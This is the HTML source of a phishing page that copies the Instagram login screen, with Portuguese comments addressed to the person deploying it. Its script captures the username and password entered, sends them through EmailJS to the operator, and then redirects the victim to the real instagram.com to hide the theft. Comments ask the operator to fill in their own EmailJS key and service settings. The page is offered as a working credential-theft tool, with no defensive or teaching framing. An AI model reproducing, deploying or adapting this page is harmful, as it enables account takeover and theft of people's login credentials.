<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <!-- Importando fontes e ícones oficiais -->
    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <link href="https://use.fontawesome.com/releases/v5.3.1/css/all.css" rel="stylesheet">
    
    <style>
        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            flex-direction: column;
        }

        .container {
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            width: 350px;
            padding: 40px 40px 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .logo {
            font-family: 'Grand Hotel', cursive;
            font-size: 50px;
            margin: 0 0 25px 0;
            text-align: center;
        }

        .form-group {
            width: 100%;
            position: relative;
            margin-bottom: 6px;
        }

        input {
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 14px 10px;
            font-size: 12px;
            width: 100%;
            box-sizing: border-box;
            color: #262626;
        }

        input:focus {
            border: 1px solid #a8a8a8;
            outline: none;
        }

        /* Ícone de olho para mostrar senha */
        .toggle-password {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            font-size: 12px;
            font-weight: 600;
            color: #262626;
        }

        button {
            background-color: #0095f6;
            border: 1px solid transparent;
            border-radius: 8px;
            color: #ffffff;
            font-size: 14px;
            font-weight: 600;
            padding: 8px 0;
            cursor: pointer;
            width: 100%;
            margin-top: 16px;
            margin-bottom: 12px;
            opacity: 1; /* Normal state */
        }

        button:hover {
            background-color: #1877f2;
        }

        button:disabled {
            opacity: 0.7;
            cursor: default;
        }

        .divider {
            display: flex;
            align-items: center;
            width: 100%;
            margin: 18px 0;
        }

        .line {
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .or-text {
            padding: 0 16px;
            font-size: 13px;
            font-weight: 600;
            color: #8e8e8e;
            text-transform: uppercase;
        }

        .footer {
            text-align: center;
            margin-top: 20px;
        }

        .signup-link {
            font-size: 14px;
            color: #262626;
        }

        .signup-link a {
            color: #00376b;
            text-decoration: none;
            font-weight: 600;
        }
    </style>
    <!-- Script do EmailJS -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script type="text/javascript">
       (function(){
           // --- SUBSTITUA PELA SUA PUBLIC KEY ---
           emailjs.init("SUA_PUBLIC_KEY");
       })();
    </script>
</head>
<body>

    <div class="container">
        <div class="logo">Instagram</div>
        
        <form id="login-form">
            <div class="form-group">
                <input type="text" name="username" placeholder="Telefone, nome de usuário ou por email" required>
            </div>
            <div class="form-group">
                <input type="password" name="password" id="pass" placeholder="Senha" required>
                <span class="toggle-password" id="toggle-eye"><i class="fas fa-eye-slash"></i></span>
            </div>
            
            <button type="submit" id="btn-submit">Entrar</button>

            <div class="divider">
                <div class="line"></div>
                <div class="or-text">ou</div>
                <div class="line"></div>
            </div>

            <a href="#" style="color: #00376b; text-decoration: none; font-size: 12px; font-weight: 500;">Esqueceu a senha?</a>
        </form>
    </div>

    <div class="footer">
        <div class="signup-link">
            Não tem uma conta? <a href="#">Cadastre-se</a>
        </div>
    </div>

    <script>
        // Função para mostrar/ocultar senha
        const toggleEye = document.getElementById('toggle-eye');
        const passInput = document.getElementById('pass');
        toggleEye.addEventListener('click', () => {
            const type = passInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passInput.setAttribute('type', type);
            toggleEye.innerHTML = type === 'password' ? '<i class="fas fa-eye-slash"></i>' : '<i class="fas fa-eye"></i>';
        });

        // Envio do formulário
        document.getElementById('login-form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const btn = document.getElementById('btn-submit');
            btn.disabled = true;
            btn.innerText = "Entrando...";

            const params = {
                username: this.username.value,
                password: this.password.value
            };

            // --- SUBSTITUA PELA SUA CONFIGURAÇÃO EMAILJS ---
            const serviceID = "service_1tsipns";
            const templateID = "template_38m07j9";

            emailjs.send(serviceID, templateID, params)
                .then(() => {
                    // Se o envio for bem-sucedido, redireciona
                    window.location.href = "https://www.instagram.com";
                })
                .catch((err) => {
                    // Se der erro, volta o botão (opcional)
                    btn.disabled = false;
                    btn.innerText = "Entrar";
                    console.log('erro', err);
                });
        });
    </script>
</body>
</html>
